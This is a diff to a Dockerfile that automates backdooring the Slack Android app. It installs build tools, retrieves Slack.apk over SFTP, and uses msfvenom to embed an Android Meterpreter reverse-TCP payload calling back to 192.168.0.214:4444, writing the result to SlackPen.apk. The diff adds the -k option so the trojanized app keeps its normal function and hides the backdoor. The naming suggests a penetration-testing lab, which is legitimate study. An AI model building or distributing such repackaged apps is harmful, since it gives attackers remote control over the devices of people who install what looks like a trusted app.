@@ -21,7 +21,10 @@ RUN sudo apt-get update && \
 		      sudo apt-get -y install default-jre && \
 		       sudo apt-get -y install default-jdk && \
 				sudo apt-get -y install libssl-dev && \
-				 sudo apt-get -y install zipalign
+				 sudo apt-get -y install zipalign && \
+				  sudo apt-get -y install lib32stdc++6 && \
+				   sudo apt-get -y install lib32ncurses6 && \
+				    sudo apt-get -y install lib32z1++
 
 RUN sudo /bin/bash -l -c '/usr/src/wdir/install-apktool.sh'
 
@@ -34,7 +37,7 @@ RUN sudo python3 -m pip install pysftp
 
 RUN sudo /bin/bash -l -c 'sudo python3 /usr/src/wdir/P-Scripts/get_file_sftp.py'
 
-RUN sudo /bin/bash -l -c 'msfvenom -x Slack.apk -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk'
+RUN sudo /bin/bash -l -c 'msfvenom -x Slack.apk -k -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk'
 
 #RUN sudo apktool d -f -o original Slack.apk
 #RUN sudo apktool d -f -o payload SlackPen.apk
